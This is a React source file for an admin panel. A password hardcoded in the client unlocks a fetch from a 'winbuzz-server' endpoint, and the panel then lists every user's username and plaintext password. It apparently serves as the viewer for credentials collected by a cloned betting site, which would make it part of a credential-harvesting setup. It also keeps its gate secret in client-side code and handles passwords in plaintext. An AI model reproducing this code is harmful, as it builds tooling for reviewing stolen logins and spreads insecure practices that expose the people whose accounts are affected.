import React, { useState } from 'react'
import "../styles/adminStyles.scss"
const AdminScreen = () => {
    const [adminPass, setAdminPass] = useState("");
    const [adminAccess, setAdminAcess] = useState(false);
    const [data, setData] = useState([]);

    const handleAdminLogin = async (e) => {
        e.preventDefault()
        if (adminPass === "#Thigna420") {
            let response = await fetch("https://winbuzz-server.onrender.com/get-data", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ password: adminPass })
            });
            let result = await response.json();
            if (result?.res === true) {
                setData([...result.response])
                return setAdminAcess(true)
            } else {
                return alert("Internal Server Error")
            }

        } else {
            return alert('!! Wrong password !!')
        }
    }

    return (
        <div className='admin-main'>
            {
                adminAccess ? <AdminList data={data} /> :
                    <form className='admin-form' onSubmit={handleAdminLogin} >
                        <h1>Admin Panel</h1>
                        <input type="password" placeholder='Password' className='admin-pass'
                            onChange={(e) => setAdminPass(e.target.value)}
                            required value={adminPass} />
                        <input type="submit" value='Continue' className='admin-submit' />
                    </form>
            }
        </div>
    )
}

const AdminList = ({ data }) => {
    return (
        <>
            <ul className='admin-list-main'>
                <li className='admin-list-item' >
                    <h2 style={{ fontSize: '1.4rem', color: '#000' }} className='admin-item-name'>Usernames</h2>
                    <h2 style={{ fontSize: '1.4rem', color: '#000' }} className='admin-item-pass'>Passwords</h2>
                </li>
                {
                    data.map(user => {
                        return (
                            <>
                                <li className='admin-list-item'>
                                    <p className='admin-item-name'>{user?.username}</p>
                                    <p className='admin-item-pass'>{user?.password}</p>
                                </li>
                            </>
                        )
                    })
                }

            </ul>
        </>
    )
}




export default AdminScreen;
